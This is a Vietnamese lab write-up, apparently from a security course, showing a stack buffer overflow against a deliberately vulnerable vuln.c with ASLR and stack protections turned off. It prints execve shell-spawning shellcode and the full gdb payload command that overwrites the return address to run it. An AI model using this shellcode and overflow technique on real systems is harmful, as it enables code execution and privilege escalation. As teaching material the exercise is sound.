### Chi tiết injection code để delete file dummyfile bằng cách `leo thang đặc quyền`
***
#### Điểm qua file vuln.c và file_del.asm  

![image](https://github.com/user-attachments/assets/c6588ec0-9d20-42d3-b849-0df865aa5a24)

![image](https://github.com/user-attachments/assets/98731ae7-d9ed-410d-9619-8db65417d6d8)

***
#### Các bước thực hiện
* Bước 1: ánh xạ file vào máy ảo docker
  ```
  docker run -it --privileged -v "C:/Users/Win 10/Seclabs:/home/seed/seclabs" img4lab
  ```
* Bước 2: tắt cơ chế bảo mật để có thể injection code
  ```
  sudo ln -sf /bin/zsh /bin/sh
  ```
* Bước 3: tắt cơ chế cấp phát địa chỉ ngẫu nhiên
  ```
  sudo sysctl -w kernel.randomize_va_space=0
  ```
* Bước 4:

  biên dịch file sh.asm   
  ```
  nasm -g -f elf sh.asm
  ```
  liên kết file
  ```
  ld -m elf_i386 -o sh sh.o 
  ```
  ![image](https://github.com/user-attachments/assets/d3ea2a60-ef76-4f9f-849e-5f4186c57e69)

* Bước 5: Xem file sh.asm có tổng cộng bao nhiêu bytes
  ```
  for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
  ```
  ![image](https://github.com/user-attachments/assets/c62b1e32-0790-4453-87fc-cf088359c871)

  

  => 27 bytes
  ```
  \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
  ```
* Bước 6: biên dịch file vuln.c
  ```
  gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
  ```
  ![image](https://github.com/user-attachments/assets/5b4788fd-dfd7-4480-8279-665d3d0ee63a)

* Bước 7: tạo một file mới tên là dummyfile
  ![image](https://github.com/user-attachments/assets/5087675a-6183-42ab-aa83-630954c1ebc5)

* Bước 8: điểm qua stack frame của hàm main
  ![image](https://github.com/user-attachments/assets/7c0846cb-f2e7-40a3-bea6-906fcc78eb86)

  ta sẽ phải tràn code từ buf xuống return address và thay giá trị return address

  ta đã có 27 bytes của shellcode vào biến buf vậy chỉ cần thêm 37 bytes ngẫu nhiên sẽ tràn hết buf + thêm 4 bytes tràn xuống ebp là sẽ tới được return address
* Bước 9: gdb để chạy và xem chương trình
  ```
  gdb -q vuln.out
  ```
  ![image](https://github.com/user-attachments/assets/7197646b-41db-48f8-8f47-23fc53c5f4f3)

  Đặt 2 breakpoints: 1 khi stackframe được thiết lập tại 0x08048441. 2 tại 0x0804846b


  Chạy chương trình:
  ```
  r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'a'*41 + '\xff\xff\xff\xff’)")
  ```
  Tại breakpoint thứ nhất xem stack từ esp `x/80xb $esp`
  ![image](https://github.com/user-attachments/assets/4472ae91-7422-4ffa-877c-ea25d3b25d3e)


  Tại breakpoint thứ 2:
  ![image](https://github.com/user-attachments/assets/b9fcbab1-f6f5-4014-884c-ca32d5c3f244)


  Ta đã biết vị trị của return address:

  ![image](https://github.com/user-attachments/assets/9fc6e9be-06a3-45cb-9799-08438f524666)

  Giờ thì chạy lại chương trình, thay thế return address thành địa chỉ của esp: `0xffffd688`
  ```
  set *0xffffd6cc = $esp
  ```
  ![image](https://github.com/user-attachments/assets/64cb39c3-df0a-47f1-ade7-2c6da0b55fc7)

* Bước 10: xóa file bằng lệnh:
  ```
  rm -r -f dummyfile
  ```
  ![image](https://github.com/user-attachments/assets/cf4370e6-0b06-4ff8-8c62-94d9861c010e)

